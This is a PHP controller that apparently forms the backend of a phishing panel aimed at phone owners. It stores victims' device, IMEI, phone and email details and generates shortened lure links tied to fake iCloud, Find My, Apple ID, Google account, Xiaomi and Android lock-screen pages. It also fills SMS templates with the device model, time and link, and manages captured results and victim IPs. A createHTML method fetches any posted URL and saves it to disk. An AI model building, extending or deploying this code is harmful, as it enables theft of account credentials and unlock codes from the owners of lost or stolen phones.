<?php 
namespace App\Controllers;

use App\Models\equipos_model;
/*use App\Models\configurar\Usuario_model;
use App\Models\configurar\Server_model;*/

class Equipos extends BaseController {

  protected $equipos_model;
  protected $sesion;

  function __construct(){
   	
    $this->session = \Config\Services::session();
    if(!$this->session->get('logueado')){
       redirect('login');
     }
    

    
   /* $this->load->model('configurar/server_model');
    $this->load->model('api/shortener/shortener_model');
    $this->load->model('configurar/paises_model');
    $this->load->model('configurar/plantillas_model');
    $this->load->model('configurar/usuario_model');
    $this->load->model('configurar/subdominio_model');    
    $this->load->model('configurar/plantillasemail_model');
    $this->load->model('configurar/api_model');
    $this->load->helper('url'); */
   
     /*if(!$this->session->userdata("logueado")){
      redirect('login');
     } */   
   
   }


	public function index(){  


       
		return redirect()->route('equipos/ingresados');
		
	}


    public function ingresados(){
       /*$datos['server'] = $this->server_model->get_server($this->session->userdata("idusuario"));  
       $datos['sessionrol'] = $this->session->userdata("rol"); 
       $datos['countequipos'] = $this->equipos_model->countequipos($this->session->userdata("idusuario"));
       $datos['countequiP'] = $this->equipos_model->countequiposstatus($this->session->userdata("idusuario"),0);
       $datos['countequiposC'] = $this->equipos_model->countequiposstatus($this->session->userdata("idusuario"),1);
       $datos['countequiposF'] = $this->equipos_model->countequiposstatus($this->session->userdata("idusuario"),2);
       $datos['countequiposPC'] = $this->equipos_model->countequiposstatus($this->session->userdata("idusuario"),3);
       $utiles['pais'] = $this->paises_model->get_paises();
       $utiles['plantillas'] = $this->plantillas_model->get_smstemplates("");
       $utiles['plantillasemail'] = $this->plantillasemail_model->get_emailtemplates("");
       $datos['datosuser']  = $this->usuario_model->get_usuarioID($this->session->userdata("idusuario"));
       $datos['idusuarioPost'] = $this->session->userdata("idusuario");
       $utiles['serversmtp'] = $this->plantillasemail_model->get_configsmtpStatus();
       $utiles['apismtp'] = $this->plantillasemail_model->get_servidoremailStatus();
       $utiles['remitenteemail'] = $this->plantillasemail_model->get_senderemail();
       $utiles['asuntoemail'] = $this->plantillasemail_model->get_asuntoemail();
       $utiles['domainsemail'] = $this->plantillasemail_model->get_domainsemail();
       $utiles['senders'] = $this->api_model->get_senders();


       $this->load->view('inc/header',$datos);   
       $this->load->view('equipos/ingresados',$utiles);*/
       echo 'hola';
    }

    public function getingresado(){
      
      if($this->input->is_ajax_request() == 'POST') {
       $idequipos = $this->input->post("idequipos");
       $response = $this->equipos_model->get_ingresadoID($this->session->userdata("idusuario"), $idequipos);
       echo json_encode($response);
      }
    }

    public function getobtenido(){


      if($this->input->is_ajax_request() == 'POST') {
        $id = $this->input->post("id");
        $response = $this->equipos_model->get_obtenidoID($this->session->userdata("idusuario"), $id);
        echo json_encode($response);
      }

    }

    public function getAllingresados(){
      if($this->input->is_ajax_request() == 'POST') {
       $buscarequipo = $this->input->post("buscarequipo");
       $response = $this->equipos_model->get_ingresados($this->session->userdata("idusuario"), $buscarequipo);
       echo json_encode($response);
      }
    }

    public function getAllobtenidos(){
      if($this->input->is_ajax_request() == 'POST') {
       $buscarequipo = $this->input->post("buscarequipo");
       $response = $this->equipos_model->get_obtenidos($this->session->userdata("idusuario"), $buscarequipo);
       echo json_encode($response);
      }
    }

    public function agregar(){
       $datos['server'] = $this->server_model->get_server($this->session->userdata("idusuario")); 
       $datos['sessionrol'] = $this->session->userdata("rol");
       $datos['datosuser']  = $this->usuario_model->get_usuarioID($this->session->userdata("idusuario"));
       $datos['idusuarioPost'] = $this->session->userdata("idusuario");
       $datos['pais']          = $this->paises_model->get_paises();
       $this->load->view('inc/header',$datos); 
       $this->load->view('equipos/agregar');
    }		


    public function obtenidos(){
      $datos['server'] = $this->server_model->get_server($this->session->userdata("idusuario"));  
      $datos['sessionrol'] = $this->session->userdata("rol"); 
      $datos['datosuser']  = $this->usuario_model->get_usuarioID($this->session->userdata("idusuario"));
      $datos['idusuarioPost'] = $this->session->userdata("idusuario");


    if($this->input->get("idob") && $this->input->get("idob") != ""){

        $obtenido = $this->equipos_model->get_obtenidoID($this->session->userdata("idusuario"),$this->input->get("idob"));
        $linkg = $obtenido['linkg'];
        $datos['email'] = $obtenido['email'];


        $datos['detalleresponses'] = $this->equipos_model->detalleresponses($linkg, $this->session->userdata("idusuario"));
        $datos['detalleresponse'] = $this->equipos_model->detalleresponse($linkg, $this->session->userdata("idusuario"));
       


        $this->load->view('inc/header',$datos);
        $this->load->view('equipos/obtenidosdetalle',$datos);        

      }else{

        $this->load->view('inc/header',$datos);   
        $this->load->view('equipos/obtenidos');

      }
      
   }


    public function reporte(){
       $datos['server'] = $this->server_model->get_server($this->session->userdata("idusuario")); 
       $datos['sessionrol'] = $this->session->userdata("rol");
       $datos['datosuser']  = $this->usuario_model->get_usuarioID($this->session->userdata("idusuario"));
       $datos['idusuarioPost'] = $this->session->userdata("idusuario");
       $reporte =  $this->usuario_model->reporte($this->session->userdata("idusuario"));
       $datos['statusReport'] = $reporte['statusreporte'];
       $datos['domreporte']   = $reporte['domreporte'];
       if($reporte['reporte'] == 1){
         $this->load->view('inc/header',$datos); 
         $this->load->view('equipos/reporte',$datos);
       }else{
        redirect('equipos/ingresados');
       }
      
    }   

    public function setEquipo(){
       
      if($this->input->is_ajax_request() == 'POST') {
       header("Content-Type: application/json");
       $array_devolver=[];
       
      
       

         //if($this->server_model->getColunmServer($this->session->userdata("idusuario"))!=0){         
          if($this->server_model->getColunmServer()!=0){      
          $serv = $this->server_model->get_server();
          $cantidadg = 3;
          $statussl = $serv['statussl'];
          $ssl = "";

          if($statussl == "ssl"){
            $ssl = "https://";
          }elseif($statussl == "nossl"){
            $ssl = "http://";
          }

          $idusuario   = $this->session->userdata("idusuario");
          $linkg       = $this->input->post("linkg").$idusuario;
          $urllinkg    = $ssl.$this->input->post("urllinkg");          
          $tipo        = $this->input->post("tipo");
          $user        = $this->input->post("user");
          $niphone     = $this->input->post("niphone");
          $pais        = $this->input->post("pais");
          $numero      = $this->input->post("numero");
          $email       = $this->input->post("email");
          $modelo_pref = $this->input->post("modelo_pref");
          $modelo      = $this->input->post("modelo");
          $imei        = $this->input->post("imei");
          $status      = $this->input->post("status");
          $visitas     = $this->input->post("visitas");
          $fecha       = date("Y-m-d H:i:s");
          $valor1      = $this->input->post("valor1");
          $valor2      = $this->input->post("valor2");
          $tipolinkg   = $this->input->post("tipolinkg");
          $subtipo     = $this->input->post("subtipo");
          $latitud     = $this->input->post("latitud");
          $longitud    = $this->input->post("longitud");
          $urlacortada = $this->input->post("urlacortada");

         // $acortador = $this->subdominio_model->subdomainAcortador($idusuario,$tipo);
          $acorSub = $this->input->post("acorSub");
          $prefij = $this->paises_model->get_prefijo($pais);
          $miprefijo = str_replace('+', '', $prefij['prefijo']);

          $datos = array("linkg" => $linkg, "urllinkg" => $urllinkg, "tipo" => $tipo, "user" => $user, "niphone" => $niphone, "pais" => $miprefijo, "numero" => $numero, "email" => $email, "modelo" => $modelo, "imei" => $imei, "status" => $status, "visitas" => $visitas, "fecha"=> $fecha, "valor1" => $valor1, "valor2" => $valor2, "tipolinkg" => $tipolinkg, "acortador"=> $acorSub, "idusuario" => $idusuario, "urllinktemp" => $subtipo, "latitud" => $latitud, "longitud" => $longitud, "urlacortada" => $urlacortada, "modelo_pref" => $modelo_pref);
           $datoslinkg = array("idservidor" => $idusuario, "idlicencia"=> $idusuario, "idusuario" => $idusuario, "linkg" => $linkg);
             
             $response = $this->equipos_model->set_Equipo($datos);
             $statusAdd = $response['status'];
          if($statusAdd){             
             $array_devolver['statusAdd'] = true;
             $array_devolver['lastInsertId'] = $response['lastInsertId'];             

             $datoslinkg = array("idservidor" => $idusuario, "idlicencia"=> $idusuario, "idusuario" => $idusuario, "linkg" => $linkg, "idequipos" => $response['lastInsertId']);
             $this->equipos_model->set_Link($datoslinkg);
             
             
            
              if($tipo == "ICN"){

                $acceso = $this->subdominio_model->selectaccesssub("ICLOUD");
                $acc = $acceso['acceso']; 
                $this->subdominio_model->update_tipoAsocequipo($acc, $tipo, $response['lastInsertId']);
              
             }elseif($tipo == "ICFM"){

                $acceso = $this->subdominio_model->selectaccesssub("ICLOUDFM");
                $acc = $acceso['acceso']; 
                $this->subdominio_model->update_tipoAsocequipo($acc, $tipo, $response['lastInsertId']); 

             }elseif($tipo == "ICMAPS"){

                $acceso = $this->subdominio_model->selectaccesssub("ICLOUDMAPS");
                $acc = $acceso['acceso']; 
                $this->subdominio_model->update_tipoAsocequipo($acc, $tipo, $response['lastInsertId']); 

             }elseif($tipo == "ICMAPSV2"){

                $acceso = $this->subdominio_model->selectaccesssub("ICLOUDMAPSV2");
                $acc = $acceso['acceso']; 
                $this->subdominio_model->update_tipoAsocequipo($acc, $tipo, $response['lastInsertId']); 

             }elseif($tipo == "Xiaomi" || $tipo == "Xiaomi2021"){
              
                $acceso = $this->subdominio_model->selectaccesssub("Xiaomi");
                $acc = $acceso['acceso']; 
                $this->subdominio_model->update_tipoAsocequipo($acc, $tipo, $response['lastInsertId']);            

             }elseif($tipo == "APPID"){

                $acceso = $this->subdominio_model->selectaccesssub("APPLEID");
                $acc = $acceso['acceso']; 
                $this->subdominio_model->update_tipoAsocequipo($acc, $tipo, $response['lastInsertId']); 

             }elseif($tipo == "RRECUP"){

                $acceso = $this->subdominio_model->selectaccesssub("RRECUP");
                $acc = $acceso['acceso']; 
                $this->subdominio_model->update_tipoAsocequipo($acc, $tipo, $response['lastInsertId']); 
              
             }elseif($tipo == "BACT"){

                $acceso = $this->subdominio_model->selectaccesssub("BACT");
                $acc = $acceso['acceso']; 
                $this->subdominio_model->update_tipoAsocequipo($acc, $tipo, $response['lastInsertId']); 
              
             }elseif($tipo == "FINDiOS13"){

                $acceso = $this->subdominio_model->selectaccesssub("FINDiOS13");
                $acc = $acceso['acceso']; 
                $this->subdominio_model->update_tipoAsocequipo($acc, $tipo, $response['lastInsertId']); 

             }elseif($tipo == "ANDBLOQPATRON" || $tipo == "ANDBLOQNUM" ||  $tipo == "ANDBLOQALFA"){

                $acceso = $this->subdominio_model->selectaccesssub("ANDBLOQ");
                $acc = $acceso['acceso']; 
                $this->subdominio_model->update_tipoAsocequipo($acc, $tipo, $response['lastInsertId']); 

             }elseif($tipo == "SUPPORT"){

                $acceso = $this->subdominio_model->selectaccesssub("SUPPORT");
                $acc = $acceso['acceso']; 
                $this->subdominio_model->update_tipoAsocequipo($acc, $tipo, $response['lastInsertId']); 

             }elseif($tipo == "GOOACCOUNT"){

                $acceso = $this->subdominio_model->selectaccesssub("GOOACCOUNT");
                $acc = $acceso['acceso']; 
                $this->subdominio_model->update_tipoAsocequipo($acc, $tipo, $response['lastInsertId']); 

             }elseif($tipo == "ICNLOCATE"){

                $acceso = $this->subdominio_model->selectaccesssub("ICNLOCATE");
                $acc = $acceso['acceso']; 
                $this->subdominio_model->update_tipoAsocequipo($acc, $tipo, $response['lastInsertId']); 

             }elseif($tipo == "ICNLOCATE2"){

                $acceso = $this->subdominio_model->selectaccesssub("ICNLOCATE2");
                $acc = $acceso['acceso']; 
                $this->subdominio_model->update_tipoAsocequipo($acc, $tipo, $response['lastInsertId']); 

             }  









            

             




          }else{
            $array_devolver['statusAdd'] = false;
          }
         }else{
           $array_devolver['servConfig'] = false;
         }

       

       
       
       echo json_encode($array_devolver);  
        
      }
  
  }




  public function eliminaringresados(){

    if($this->input->is_ajax_request() == 'POST') {
       header("Content-Type: application/json");
       $array_devolver=[];
       
       $idusuario = $this->session->userdata("idusuario");
       $idequipos = $this->input->post("idequipos");

       $equipo = $this->equipos_model->get_ingresadoID($idusuario,$idequipos);
       $linkg = $equipo['linkg'];
       

       

       if($this->equipos_model->eliminareEquipo($idusuario, $idequipos)){

          $this->equipos_model->eliminarelinkg($idusuario, $idequipos);
          $this->shortener_model->eliminareshort_urls($idusuario, $linkg);
          $array_devolver['statusdelete'] = true;

       }else{
         $array_devolver['statusdelete'] = false;
       }   
         echo json_encode($array_devolver);  
        
    }   

  }



    public function modificaringresado(){

    if($this->input->is_ajax_request() == 'POST') {
       header("Content-Type: application/json");
       $array_devolver=[];
       
       $idusuario        = $this->session->userdata("idusuario");
       $idequipos        = $this->input->post("idequipo");
       $plataforma       = $this->input->post("tipo");
       $igeneratelink    = $this->input->post("urllinkg");
       $igeneratelink2   = $this->input->post("urllinkg2");
       $status           = $this->input->post("status");
       $valor1           = $this->input->post("valor1");
       $valor2           = $this->input->post("valor2"); 
       $user             = $this->input->post("user"); 
       $niphone          = $this->input->post("niphone"); 
       $numero           = $this->input->post("numero"); 
       $email            = $this->input->post("email"); 
       $modelo           = $this->input->post("modelo"); 
       $imei             = $this->input->post("imei"); 

      

     
       $response   = $this->equipos_model->get_ingresadoID($this->session->userdata("idusuario"), $idequipos);
       $urllinkg     = $response['urllinkg'];
       $urllinkshort = $response['urllinkshort'];
       $linkg        = $response['linkg'];
       

       $short_urls = $this->equipos_model->short_urls($linkg, $this->session->userdata("idusuario"));
       $long_url = $short_urls['long_url'];


       //str_replace("world","Peter","Hello world!");

      
         $urllinkgRep     = str_replace(substr($urllinkg, 0, -8),$igeneratelink2, $urllinkg);
         $urllinkshortRep = str_replace(substr($urllinkshort, 0, -4),$igeneratelink2, $urllinkshort);
         $long_urlRep     = str_replace(substr($long_url, 0, -8),$igeneratelink2, $long_url);
         $status          = "0";
         $visitas         = 0;
         $tipo            = $plataforma;

         $upd1 = $this->equipos_model->updateUrllinkgUrllinkshort($this->session->userdata("idusuario"), $idequipos, "https://".$urllinkgRep, "https://".$urllinkshortRep, $tipo, $status, $visitas, $valor1, $valor2, $user, $niphone, $numero, $email, $modelo, $imei);
         $upd2 = $this->equipos_model->updateShort_urls($this->session->userdata("idusuario"), $linkg, $long_urlRep);
       
        if($upd1 && $upd2){

            $array_devolver['statusAdd'] = true;
        }else{
            $array_devolver['statusAdd'] = false;
        }


        $array_devolver['datos'] = $urllinkgRep;
       echo json_encode($array_devolver);  
    }   

  }


   public function eliminaobtenido(){

    if($this->input->is_ajax_request() == 'POST') {
       header("Content-Type: application/json");
       $array_devolver=[];
       
       $idusuario = $this->session->userdata("idusuario");
       $id = $this->input->post("id");

       $equipo = $this->equipos_model->get_obtenidoID($idusuario,$id);
       $linkg = $equipo['linkg'];
       

       

       if($this->equipos_model->eliminareObtenido($idusuario, $id)){

          $this->equipos_model->eliminardetalleres($idusuario, $linkg);
          $array_devolver['statusdelete'] = true;

       }else{
         $array_devolver['statusdelete'] = false;
       }   
         echo json_encode($array_devolver);  
        
    }   

  }


   public function totalcountnoti(){
        
        $array_devolver=[];        
        $response = $this->equipos_model->totalcountnoti($this->session->userdata("idusuario"));
        //$array_devolver['counttotal'] = $response;

        echo json_encode($response);     

    }


   public function countequipos(){    

      $response = $this->equipos_model->countequipos($this->session->userdata("idusuario"));
      echo json_encode($response);   

   }

    public function countequiP(){

      $array_devolver=[]; 
      $status = $this->input->post('status');
      $response = $this->equipos_model->countequiposstatus($this->session->userdata("idusuario"), $status);

      echo json_encode($response);  


   }



   public function selectplantilla(){

      $array_devolver=[]; 
      $descripsms = $this->input->post('descripsms');
      $modelo = $this->input->post('modelo');
      $linkg = $this->input->post('linkg');
      $nombreIphone = $this->input->post('nombreIphone');
      date_default_timezone_set("America/Lima");
      $hora = date('H:i');

       $urlshortfinal = str_replace('apple.findmy', 'icloud', $linkg);


        $texto = $descripsms;
        $texto1 = str_replace('{{model}}', $modelo, $texto);
        $texto2 = str_replace('{{time}}', $hora, $texto1);
        $texto3 = str_replace('{{link}}', $urlshortfinal, $texto2);
        $salida = str_replace('{{device}}', $nombreIphone, $texto3);

        $array_devolver['descripcion'] = str_replace('https://www.', 'https://', $salida);


         echo json_encode($array_devolver);  
        

   }
   
   
  public function refresip(){
      
      $array_devolver=[]; 
      $id = $this->input->post('id');
      $resp = $this->equipos_model->get_opobtenido($id);
      $ip  = $resp['ip'];
      
      if($this->equipos_model->refresip($ip)){
          
          $array_devolver['status'] = true;
          
      }else{
          $array_devolver['status'] = false;
      }
      
      
      echo json_encode($array_devolver);  
      
  } 



  public function createHTML(){

    if($this->input->is_ajax_request() == 'POST') {
      header("Content-Type: application/json");
      $array_devolver=[];

      $contenido   = $this->input->post('contenido');
      $descripcion = $this->input->post('descripcion');
      $linkg       = $this->input->post('linkg');
      $ruta        = "assets/server/js/equipos/mapa/plantillas/";
      $status      = 1;

     /* $datos = array("descripcion" => $descripcion, "ruta" => $ruta, "status" => $status);

      if($this->plantillasemail_model->set_EmailTemplates($datos)){

        $array_devolver['status'] = true;

      }else{

        $array_devolver['status'] = false;
      }*/
     

     $array_devolver['status'] = true;

      
       $src = $contenido;
       $time = time();
       $desFolder = 'assets/server/js/equipos/mapa/plantillas/';
       $imageName = 'google-map_'.$time.'.PNG';
       $imagePath = $desFolder.$imageName;
       file_put_contents($imagePath,file_get_contents($src));
    
    
      echo json_encode($array_devolver);  

    }



    
   }


  



   
    

  
}

